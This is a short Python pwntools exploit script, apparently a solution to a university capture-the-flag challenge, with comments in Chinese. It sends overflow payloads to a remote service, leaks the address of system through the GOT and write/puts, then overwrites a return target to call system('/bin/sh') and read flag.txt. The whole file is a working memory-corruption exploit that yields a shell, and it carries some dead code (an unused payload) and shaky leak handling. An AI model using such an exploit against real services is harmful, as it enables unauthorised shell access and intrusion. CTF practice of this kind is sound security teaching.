from pwn import *

HOST = "cs412.epfl.ch"
PORT = 9035

conn = remote(HOST, PORT)



conn.recvuntil(b"> ")

def send_cmd(cmd):
    """ 发送菜单命令 """
    conn.sendline(str(cmd).encode())

send_cmd(1)

# 构造 payload


elf = ELF("./chal")
payload2 = p64(elf.got["system"])
payload2 = payload2.ljust(88, b"A")
payload2 += p64(elf.plt["puts"])

payload3  = p64(elf.got["system"])      # content = 要泄露的地址
payload3 += p64(1)                      # stdout (文件描述符1)
payload3 += p64(elf.got["system"])      # buf = system的GOT地址
payload3 += p64(8)                      # len = 8 字节
payload3  = payload3.ljust(88, b"A") + p64(elf.plt["write"])


conn.sendline(payload3)
conn.recvuntil(b"> ")
send_cmd(2)

leaked = conn.recvline().strip()
if len(leaked) < 6:
    print("❌ 泄露的数据长度不足，明显出错。")
else:
    leaked_addr = u64(leaked.ljust(8, b"\x00"))
    print(f"泄露地址为：{hex(leaked_addr)}")
system_real_address = u64(leaked)

log.success(f"system真实地址：{hex(system_real_address)}")

payload = b"/bin/sh\x00"
payload = payload.ljust(88, b"A")
payload += p64(system_real_address)

send_cmd(1)
conn.sendline(payload)
conn.recvuntil(b"> ")

# Step 3: 调用system('/bin/sh')拿到shell
send_cmd(2)
conn.sendline(b"cat flag.txt")
flag = conn.recvline().decode()
log.success(f"flag内容: {flag}")


conn.close()